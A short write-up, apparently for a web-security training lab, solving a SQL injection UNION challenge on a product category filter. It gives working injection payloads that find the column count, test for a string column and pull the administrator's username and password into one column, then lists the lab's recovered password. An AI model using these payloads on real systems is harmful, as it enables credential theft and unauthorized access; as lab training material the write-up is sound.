
# Lab: SQL injection UNION attack, retrieving multiple values in a single column


## Lab Information

This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response so you can use a UNION attack to retrieve data from other tables.

The database contains a different table called `users`, with columns called `username` and `password`.

To solve the lab, perform a SQL injection UNION attack that retrieves all usernames and passwords, and use the information to log in as the `administrator` user.

## Steps to Reproduce

### Finding number of Columns

- Add the below payload to the `category` URL.
- So total columns are **2**.

```sql
'+UNION+SELECT+NULL,+NULL--
```

### Finding String type Compatible Column

- The below payload used to find string compatible column.
- So column **2** is string compatible.

```sql
'+UNION+SELECT+NULL,'a'--
```


### Retrieving `administrator` Credentials

- Using the below payload we can retrieve `administrator` username and password from a **single column**.

```sql
'+UNION+SELECT+NULL,+username||'~'||password+FROM+users+WHERE+username='administrator'--
```

- We got the below credentials
	- **username** = `administrator`
	- **password** = `j04ycauom66x3r93q58b`

## Login

- Use the gained credentials to login as `administrator`.

